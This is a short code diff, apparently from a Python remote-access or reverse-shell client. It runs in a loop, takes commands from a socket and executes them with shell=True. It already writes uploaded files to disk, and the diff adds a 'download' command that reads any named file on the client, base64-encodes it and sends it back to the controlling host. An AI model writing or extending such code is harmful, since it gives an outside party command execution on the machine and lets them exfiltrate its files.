@@ -26,6 +26,14 @@ while True:
             list_command = command.split(' ')
             with open(list_command[1], "wb") as file_open:
                 file_open.write(base64.b64decode(file))
+        
+        elif "download" in command:
+            path_in_client = command.split(" ")
+            with open (path_in_client[1], '+rb') as file:
+                data = file.read()
+            b64 = base64.b64encode(data)
+            time.sleep(1)
+            client_socket.send(b64)
 
         else:
             ex = subprocess.check_output(command, shell=True).decode()
